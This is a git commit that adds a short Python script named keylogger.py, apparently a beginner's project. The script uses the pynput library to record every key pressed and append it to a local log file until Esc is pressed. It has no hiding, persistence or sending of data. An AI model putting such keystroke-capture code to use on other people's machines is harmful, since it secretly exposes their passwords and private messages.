e8421ee431424d07b07f590d78591db349cf6a20
Arvind Singh Rajpurohit <arvindsingh7567517479@gmail.com>
2025-07-23 17:18:20 +0530

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,14 @@
+from pynput.keyboard import Listener,Key
+def write_to_file(keey):
+    letter = str(keey)
+    letter= letter.replace("'","")
+    if letter == 'Key.space':
+        letter =' '
+    if letter =='Key.shift':
+        letter= ''
+    with open("D:\LANGUAGE\Python\Project\KeyLogger\log.txt","a") as f:
+        f.write(letter)
+        if keey ==Key.esc:
+            return False
+with Listener(on_press=write_to_file) as l:
+    l.join()
